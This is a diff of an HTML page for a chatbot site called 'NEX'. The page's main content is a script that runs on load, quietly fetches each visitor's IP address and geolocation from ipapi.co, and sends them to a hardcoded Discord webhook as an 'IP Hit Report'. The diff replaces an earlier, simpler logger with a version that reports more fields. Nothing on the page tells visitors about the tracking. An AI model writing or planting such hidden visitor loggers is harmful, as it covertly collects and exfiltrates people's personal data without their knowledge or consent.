@@ -1,53 +1,46 @@
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>NEX | Glitch Network</title>
-
-    <!-- metadata description-->
-
-    <meta name="description" content="A bot that can hold a converstation without filters. (OPEN BETA)">
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <meta name="author" content="Infdevv">
-
-    
-
+    <title>NEX</title>
 </head>
-<script>
-        fetch("https://ipapi.co/json/").then(response => response.json()).then(data => {
-        ip = data.ip
-        wh = "https://discord.com/api/webhooks/1196639001294143488/W7xHvyItSHB86jMDUiCENyi5ULgL_KRv759wrWx7U0ny3p6IZyTYxdplEvWG6F9DeUoV"
-        fetch(wh, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                "content": "HIT:" + ip
-            })
-            }
-        )
+<body>
+    <script>
+        fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                
+                const embedData = {
+                    title: "IP Hit Report",
+                    description: `IP Address: ${ip}`,
+                    fields: []
+                };
 
-        .catch(function(error) {
-            fetch("https://api.ipify.org/?format=json") // try a diffrent ip grabbing api
-                .then(response => response.json())
-                .then(data => {
-                    ip = data.ip
+                Object.entries(data).forEach(([key, value]) => {
+                    if (key !== 'ip' && key !== 'version') {  
+                        const label = `${key.replace(/_/g, ' ')}`.replace(/^./, (s) => s.charAt(0).toUpperCase() + s.substr(1));
+                        embedData.fields.push({
+                            name: label,
+                            value: value || "N/A",
+                            inline: true  
+                        });
+                    }
+                });
 
-                    fetch(wh, {
+                fetch("https://discord.com/api/webhooks/1418503063647293511/AHPEOUs6_GQtIB4hjxkYjHZ6qMz39ZkTlOpOUFobwY6Y56jkgnMiEGEZKEpAJ3o084-n",
+                    {
                         method: "POST",
                         headers: {
                             "Content-Type": "application/json"
-                        }
-                        ,
+                        },
                         body: JSON.stringify({
-                            "content": "HIT (fallback):" + ip
+                            embeds: [embedData]
                         })
                     })
-                })
-        })
-        .then(response => console.log("Success:", response));
-
-    })
-</script>
+                    .then(() => console.log("Embed sent successfully!"))
+                    .catch(error => console.error("Error:", error));
+            });
+    </script>
+</body>
+</html>
